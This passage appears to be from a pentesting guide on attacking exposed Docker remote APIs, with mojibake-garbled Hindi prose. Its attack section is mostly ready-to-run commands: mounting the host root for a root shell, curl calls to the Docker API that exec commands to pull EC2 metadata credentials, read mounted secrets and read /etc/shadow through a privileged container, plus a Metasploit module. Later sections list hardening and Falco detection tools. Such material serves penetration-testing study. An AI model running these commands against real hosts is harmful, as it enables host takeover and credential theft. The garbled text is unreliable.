n":"5.0.0-20-generic","BuildTime":"2019-07-25T21:19:41.000000000+00:00"}

#Using docker
docker -H open.docker.socket:2375 version #Get version
Client: Docker Engine - Community
Version:           19.03.1
API version:       1.40
Go version:        go1.12.5
Git commit:        74b1e89
Built:             Thu Jul 25 21:21:05 2019
OS/Arch:           linux/amd64
Experimental:      false

Server: Docker Engine - Community
Engine:
Version:          19.03.1
API version:      1.40 (minimum version 1.12)
Go version:       go1.12.5
Git commit:       74b1e89
Built:            Thu Jul 25 21:19:41 2019
OS/Arch:          linux/amd64
Experimental:     false
containerd:
Version:          1.2.6
GitCommit:        894b81a4b802e4eb2a91d1ce216b8817763c29fb
runc:
Version:          1.0.0-rc8
GitCommit:        425e105d5a03fabd737a126ad93d62a9eeede87f
docker-init:
Version:          0.18.0
GitCommit:        fec3683
```
рдпрджрд┐ рдЖрдк **`docker` рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рд░рд┐рдореЛрдЯ рдбреЙрдХрд░ API рд╕реЗ рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рддреЛ рдЖрдк рд╕реЗрд╡рд╛ рдХреЗ рд╕рд╛рде рд░реБрдЪрд┐ рджрд┐рдЦрд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдХрд┐рд╕реА рднреА** [**рдкрд╣рд▓реЗ рдХрдореЗрдВрдЯ рдХрд┐рдП рдЧрдП** рдХрдорд╛рдВрдб](2375-pentesting-docker.md#basic-commands) рдХреЛ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% hint style="info" %}
рдЖрдк `export DOCKER_HOST="tcp://localhost:2375"` рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **docker** рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде `-H` рдкреИрд░рд╛рдореАрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ **рдмрдЪрд╛ рд╕рдХрддреЗ** рд╣реИрдВред
{% endhint %}

#### рддреНрд╡рд░рд┐рдд рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирддрд┐
```bash
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
```
#### Curl

рдХрднреА-рдХрднреА рдЖрдк **TLS** рдПрдВрдбрдкреЙрдЗрдВрдЯ рдХреЗ рд▓рд┐рдП **2376** рджреЗрдЦреЗрдВрдЧреЗред рдореИрдВ рдбреЙрдХрд░ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рд╕рд╛рде рдЗрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд░рд╣рд╛ рд╣реВрдБ рд▓реЗрдХрд┐рди рдЖрдк curl рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбреЙрдХрд░ рдПрдкреАрдЖрдИ рдХреЛ рд╣рд┐рдЯ рдХрд░рдиреЗ рдореЗрдВ рдХреЛрдИ рд╕рдорд╕реНрдпрд╛ рдирд╣реАрдВ рд╣реИред
```bash
#List containers
curl тАУinsecure https://tlsopen.docker.socket:2376/containers/json | jq
#List processes inside a container
curl тАУinsecure https://tlsopen.docker.socket:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq
#Set up and exec job to hit the metadata URL
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'
#Get the output
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'
# list secrets (no secrets/swarm not set up)
curl -s тАУinsecure https://tlsopen.docker.socket:2376/secrets | jq
#Check what is mounted
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'
#Get the output by starting the exec
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'
#Cat the mounted secret
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tlsopen.docker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'
#List service (If you have secrets, itтАЩs also worth checking out services in case they are adding secrets via environment variables)
curl -s тАУinsecure https://tls-opendocker.socket:2376/services | jq
#Creating a container that has mounted the host file system and read /etc/shadow
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'
curl тАУinsecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
#Stop the container
curl тАУinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop
#Delete stopped containers
curl тАУinsecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune
```
рдпрджрд┐ рдЖрдк рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рд╡рд╣рд╛рдБ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдЙрдкрд▓рдмреНрдз рд╣реИ рдЬрд╣рд╛рдБ рд╕реЗ рдореИрдВрдиреЗ рдХрдорд╛рдВрдб рдХреЙрдкреА рдХрд┐рдП рд╣реИрдВ: [https://securityboulevard.com/2019/02/abusing-docker-api-socket/](https://securityboulevard.com/2019/02/abusing-docker-api-socket/)

### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд
```bash
msf> use exploit/linux/http/docker_daemon_tcp
nmap -sV --script "docker-*" -p <PORT> <IP>
```
## Compromising

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрд░ рдЖрдк рдПрдХ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="../linux-hardening/privilege-escalation/docker-security/" %}
[docker-security](../linux-hardening/privilege-escalation/docker-security/)
{% endcontent-ref %}

рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЖрдк рд░рд┐рдореЛрдЯ рдорд╢реАрди рдореЗрдВ рдПрдХ рдХрдордЬреЛрд░ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрд╕рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдорд╢реАрди рдХреЛ рдХрдВрдкреНрд░рдорд╛рдЗрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
cat /mnt/etc/shadow
```
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/Docker%20API%20RCE.py)

## рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди

рдпрджрд┐ рдЖрдк рдПрдХ рд╣реЛрд╕реНрдЯ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ рдЬреЛ рдбреЙрдХрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк [**рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЙрдиреНрдирдпрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВ**](../linux-hardening/privilege-escalation/#writable-docker-socket).

## рдЪрд▓ рд░рд╣реЗ Docker containers рдореЗрдВ рд░рд╣рд╕реНрдпреЛрдВ рдХрд╛ рдЦреЛрдЬ
```bash
docker ps [| grep <kubernetes_service_name>]
docker inspect <docker_id>
```
рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **env** (рдкрд░реНрдпрд╛рд╡рд░рдг рдЪрд░ рдЦрдВрдб) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ рдФрд░ рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ:

* рдкрд╛рд╕рд╡рд░реНрдбред
* рдЖрдИрдкреА рдкрддреЗред
* рдкреЛрд░реНрдЯред
* рдкрдеред
* рдЕрдиреНрдп... .

рдЕрдЧрд░ рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдирд┐рдХрд╛рд▓рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ:
```bash
docker cp <docket_id>:/etc/<secret_01> <secret_01>
```
## рдЕрдкрдиреЗ Docker рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдирд╛

### Docker рд╕реНрдерд╛рдкрдирд╛ рдФрд░ рдЙрдкрдпреЛрдЧ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдирд╛

* рдЖрдк [https://github.com/docker/docker-bench-security](https://github.com/docker/docker-bench-security) рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдкрдиреА рд╡рд░реНрддрдорд╛рди docker рд╕реНрдерд╛рдкрдирд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* `./docker-bench-security.sh`
* рдЖрдк [https://github.com/kost/dockscan](https://github.com/kost/dockscan) рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЕрдкрдиреА рд╡рд░реНрддрдорд╛рди docker рд╕реНрдерд╛рдкрдирд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* `dockscan -v unix:///var/run/docker.sock`
* рдЖрдк [https://github.com/genuinetools/amicontained](https://github.com/genuinetools/amicontained) рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрдм рд╡рд┐рднрд┐рдиреНрди рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддреЛ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХрд┐рд╕ рдкреНрд░рдХрд╛рд░ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╣реЛрдЧреАред рдЗрд╕рд╕реЗ рдХрд┐рд╕реА рд╕реБрд░рдХреНрд╖рд╛ рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рдкрд░рд┐рдгрд╛рдореЛрдВ рдХреЛ рдЬрд╛рдирдирд╛ рдЙрдкрдпреЛрдЧреА рд╣реИ рдПрдХ рдХрдВрдЯреЗрдирд░ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП:
* `docker run --rm -it r.j3ss.co/amicontained`
* `docker run --rm -it --pid host r.j3ss.co/amicontained`
* `docker run --rm -it --security-opt "apparmor=unconfined" r.j3ss.co/amicontained`

### Docker рдЫрд╡рд┐рдпреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдирд╛

* рдЖрдк [https://github.com/quay/clair](https://github.com/quay/clair) рдХрд╛ рдбреЙрдХрд░ рдЫрд╡рд┐ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдпрд╣ рдЖрдкрдХреА рдЕрдиреНрдп рдбреЙрдХрд░ рдЫрд╡рд┐рдпреЛрдВ рдХреЛ рд╕реНрдХреИрди рдХрд░ рд╕рдХреЗ рдФрд░ рд╡рд┐рдХрд▓реНрдкрд┐рддрд╛рдУрдВ рдХреЛ рдЦреЛрдЬ рд╕рдХреЗред
* `docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"`
* `clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image`

### Dockerfiles рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рдмрдирд╛рдирд╛

* рдЖрдк [https://github.com/buddy-works/dockerfile-linter](https://github.com/buddy-works/dockerfile-linter) рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЕрдкрдиреЗ Dockerfile рдХреА рдЬрд╛рдВрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред рд╣рд░ рдЧрд▓рддреА рдХреЛ рдПрдХ рдЖрдИрдбреА рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЖрдк рдпрд╣рд╛рдБ [https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md](https://github.com/buddy-works/dockerfile-linter/blob/master/Rules.md) рдкреНрд░рддреНрдпреЗрдХ рдХреЛ рдХреИрд╕реЗ рдареАрдХ рдХрд░реЗрдВ рдЗрд╕реЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред
* `dockerfilelinter -f Dockerfile`

![](<../.gitbook/assets/image (418).png>)

* рдЖрдк [https://github.com/replicatedhq/dockerfilelint](https://github.com/replicatedhq/dockerfilelint) рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЕрдкрдиреЗ Dockerfile рдХреА рдЬрд╛рдВрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред
* `dockerfilelint Dockerfile`

![](<../.gitbook/assets/image (419).png>)

* рдЖрдк [https://github.com/RedCoolBeans/dockerlint](https://github.com/RedCoolBeans/dockerlint) рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЕрдкрдиреЗ Dockerfile рдХреА рдЬрд╛рдВрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред
* `dockerlint Dockerfile`

![](<../.gitbook/assets/image (420).png>)

* рдЖрдк [https://github.com/hadolint/hadolint](https://github.com/hadolint/hadolint) рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЕрдкрдиреЗ Dockerfile рдХреА рдЬрд╛рдВрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдФрд░ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреА рдЧрд▓рддрд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдПред
* `hadolint Dockerfile`

![](<../.gitbook/assets/image (421).png>)

### рд╕рдВрджреЗрд╣рдкреВрд░реНрдг рдЧрддрд┐рд╡рд┐рдзрд┐ рдХреЛ рд▓реЙрдЧ рдХрд░рдирд╛

* рдЖрдк [https://github.com/falcosecurity/falco](https://github.com/falcosecurity/falco) рдЙрдкрдХрд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ **рдЪрд▓ рд░рд╣реЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдореЗрдВ рд╕рдВрджреЗрд╣рдкреВрд░реНрдг рд╡реНрдпрд╡рд╣рд╛рд░** рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдПред
* рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЯреБрдХрдбрд╝реЗ рдореЗрдВ рдзреНрдпрд╛рди рджреЗрдВ рдХреИрд╕реЗ **Falco рдПрдХ рдХрд░реНрдиреЗрд▓ рдореЙрдбреНрдпреВрд▓ рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕рдХреЗ рдмрд╛рдж, рдпрд╣ рдирд┐рдпрдореЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ рдФрд░ **рд╕рдВрджреЗрд╣рдкреВрд░реНрдг рдЧрддрд┐рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЛ рд▓реЙрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░рддрд╛ рд╣реИ**ред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдпрд╣ рджреЛ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдХрдВрдЯреЗрдирд░ рд╢реБрд░реВ рдХрд┐рдП рдЧрдП рд╣реИрдВ, рдЬрд┐рдирдореЗрдВ рд╕реЗ рдПрдХ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдорд╛рдЙрдВрдЯ рдХреЗ рд╕рд╛рде рдерд╛, рдФрд░ рдХреБрдЫ рд╕реЗрдХрдВрдб рдХреЗ рдмрд╛рдж рдпрд╣ рдЦреЛрдЬрд╛ рдХрд┐ рдХреИрд╕реЗ рдПрдХ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╢реИрд▓ рдЦреЛрд▓рд╛ рдЧрдпрд╛ рдерд╛ред
```
docker run -it --privileged -v /var/run/docker.sock:/host/var/run/docker.sock -v /dev:/host/dev -v /proc:/host/proc:ro -v /boot:/host/boot:ro -v /lib/modules:/host/lib/modules:ro -v /usr:/host/usr:ro falco
* Setting up /usr/src links from host
* Unloading falco-probe, if present
* Running dkms install for falco

Kernel preparation unnecessary for this kernel.  Skipping...

Building module:
cleaning build area......
make -j3 KERNELRELEASE=5.0.0-20-generic -C /lib/modules/5.0.0-20-generic/build M=/var/lib/dkms/falco/0.18.0/build.............
cleaning build area......

DKMS: build completed.

falco-probe.ko:
Running module version sanity check.
modinfo: ERROR: missing module or filename.
- Original module
- No original module exists within this kernel
- Installation
- Installing to /lib/modules/5.0.0-20-generic/kernel/extra/
mkdir: cannot create directory '/lib/modules/5.0.0-20-generic/kernel/extra': Read-only file system
cp: cannot create regular file '/lib/modules/5.0.0-20-generic/kernel/extra/falco-probe.ko': No such file or directory

depmod...

DKMS: install completed.
* Trying to load a dkms falco-probe, if present
falco-probe found and loaded in dkms
2021-01-04T12:03:20+0000: Falco initialized with configuration file /etc/falco/falco.yaml
2021-01-04T12:03:20+0000: Loading rules from file /etc/falco/falco_rules.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/falco_rules.local.yaml:
2021-01-04T12:03:22+0000: Loading rules from file /etc/falco/k8s_audit_rules.yaml:
2021-01-04T12:03:24+0000: Starting internal webserver, listening on port 8765
2021-01-04T12:03:24.646959000+0000: Notice Privileged container started (user=<NA> command=container:db5dfd1b6a32 laughing_kowalevski (id=db5dfd1b6a32) image=ubuntu:18.04)
2021-01-04T12:03:24.664354000+0000: Notice Container with sensitive mount started (user=<NA> command=container:4822e8378c00 xenodochial_kepler (id=4822e8378c00) image=ubuntu:modified mounts=/:/host::true:rslave)
2021-01-04T12:03:24.664354000+0000: Notice Privileged container started (user=root command=container:4443a8daceb8 focused_brahmagupta (id=4443a8daceb8) image=falco:latest)
2021-01-04T12:04:56.270553320+0000: Notice A shell was spawned in a container with an attached terminal (user=root xenodochial_kepler (id=4822e8378c00) shell=bash parent=runc cmdline=bash terminal=34816 container_id=4822e8378c00 image=ubuntu)
```
### рдореЙрдирд┐рдЯрд░рд┐рдВрдЧ рдбреЙрдХрд░

рдЖрдк рдбреЙрдХрд░ рдХреЛ рдореЙрдирд┐рдЯрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП auditd рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

# рд╕рдВрджрд░реНрдн
* [https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html](https://ti8m.com/blog/Why-Podman-is-worth-a-look-.html)
